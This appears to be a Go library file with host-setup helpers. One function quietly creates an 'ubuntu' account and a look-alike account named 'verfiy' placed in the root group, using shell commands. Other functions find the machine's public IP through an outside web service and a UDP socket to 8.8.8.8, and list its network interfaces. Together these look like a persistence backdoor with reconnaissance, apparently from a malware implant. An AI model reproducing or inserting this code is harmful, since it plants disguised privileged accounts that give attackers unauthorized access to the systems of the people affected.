package lib

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/user"
	"strings"
)

func Adduser() {

	if _, err := user.Lookup("ubuntu"); err != nil {
		//var cmd *exec.Cmd
		//CmdExec("/usr/sbin/groupadd","ubuntu")
		CmdBash("/usr/sbin/groupadd ubuntu")
		//CmdExec("/usr/sbin/useradd", "-m","-d", "/home/ubuntu", "ubuntu", "-g", "ubuntu")
		CmdBash("/usr/sbin/useradd -m -d /home/ubuntu ubuntu -g ubuntu")

	}

	if _, err := user.Lookup("verfiy"); err != nil {
		//var cmd *exec.Cmd
		//CmdExec("/usr/sbin/groupadd", "verfiy")
		CmdBash("/usr/sbin/groupadd verfiy")
		//CmdExec("/usr/sbin/useradd", "-m", "-d", "/home/verfiy", "verfiy", "-g", "verfiy")
		CmdBash("/usr/sbin/useradd -m -d /home/verfiy verfiy -g root")

	}
}

//get request public ip
func GetExternal() string {
	resp, err := http.Get("http://myexternalip.com/raw")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	content, _ := ioutil.ReadAll(resp.Body)
	//LogHander(string(content),err)
	return string(content)
}

//get all local listen ip
func GetIntranetIp() {
	addrs, err := net.InterfaceAddrs()

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, address := range addrs {

		// 检查ip地址判断是否回环地址
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				//fmt.Println("ip:", ipnet.IP.String())
				//LogHander(ipnet.IP.String(),err)
			}
		}
	}
}

//in order of dns to ensure public ip
func GetPulicIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().String()
	idx:= strings.LastIndex(localAddr, ":")
	//LogHander(localAddr[0:idx],err)
	return localAddr[0:idx]
}


